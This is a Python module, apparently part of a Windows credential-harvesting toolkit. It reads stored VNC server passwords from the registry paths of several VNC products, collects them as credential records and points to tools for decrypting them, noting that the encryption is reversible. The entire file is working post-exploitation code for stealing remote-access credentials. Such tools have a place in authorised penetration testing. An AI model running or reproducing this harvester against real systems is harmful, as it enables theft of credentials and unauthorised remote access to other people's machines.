#!/usr/bin/env python3
"""
VNC Password Miner
Extract VNC server passwords from registry
"""

import winreg
from typing import List, Dict

from ..utils import safe_open_key, safe_query_value


class VNCMiner:
    """
    Extract VNC server passwords
    
    Locations: Various VNC software registry paths
    Privilege: Requires admin for HKLM access
    """
    
    MINER_NAME = "vnc"
    REQUIRES_ADMIN = True
    
    def __init__(self):
        # Different VNC flavors store passwords in different locations
        self.vnc_paths = [
            (r"SOFTWARE\RealVNC\WinVNC4", "RealVNC"),
            (r"SOFTWARE\TightVNC\Server", "TightVNC"),
            (r"SOFTWARE\TigerVNC\WinVNC4", "TigerVNC"),
            (r"SOFTWARE\UltraVNC", "UltraVNC"),
            (r"SOFTWARE\ORL\WinVNC3", "WinVNC3")
        ]
    
    def mine(self) -> List[Dict]:
        """
        Extract VNC passwords
        
        Returns:
            List of credential dictionaries
        """
        print(f"\n[*] Mining VNC passwords...")
        print(f"[*] Checking multiple VNC software locations...")
        
        credentials = []
        
        for path, vnc_type in self.vnc_paths:
            key = safe_open_key(winreg.HKEY_LOCAL_MACHINE, path)
            
            if not key:
                continue  # This VNC flavor not installed
            
            try:
                # Look for password value
                password_result = safe_query_value(key, "Password")
                
                if password_result:
                    password_data = password_result[0]
                    
                    # Convert to hex if binary
                    if isinstance(password_data, bytes):
                        encrypted_hex = password_data.hex()
                    else:
                        encrypted_hex = str(password_data)
                    
                    cred = {
                        'source': 'VNC Server',
                        'location': f'HKLM\\{path}',
                        'vnc_type': vnc_type,
                        'encrypted_password': encrypted_hex
                    }
                    
                    credentials.append(cred)
                    
                    print(f"[+] Found VNC password:")
                    print(f"    Type: {vnc_type}")
                    print(f"    Location: {path}")
                    print(f"    Encrypted: {encrypted_hex[:32]}..." if len(encrypted_hex) > 32 else f"    Encrypted: {encrypted_hex}")
                    print(f"    Note: Use VNC password decryption tools")
            
            finally:
                winreg.CloseKey(key)
        
        if not credentials:
            print(f"[-] No VNC passwords found")
        
        return credentials
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this miner"""
        return {
            'name': 'vnc',
            'description': 'Extract VNC server passwords',
            'requires_admin': True,
            'requires_system': False,
            'registry_locations': [
                r'HKLM\SOFTWARE\RealVNC\WinVNC4',
                r'HKLM\SOFTWARE\TightVNC\Server',
                r'HKLM\SOFTWARE\TigerVNC\WinVNC4',
                r'HKLM\SOFTWARE\UltraVNC',
                r'HKLM\SOFTWARE\ORL\WinVNC3'
            ],
            'credential_types': ['encrypted password'],
            'notes': [
                'VNC passwords stored encrypted in registry',
                'Encryption is weak and reversible',
                'Tools available for decryption',
                'Requires local administrator privileges',
                'Different VNC flavors use different locations'
            ],
            'decryption_tools': [
                'vncpasswd.py',
                'VNCPassView',
                'Metasploit vnc_login module'
            ]
        }
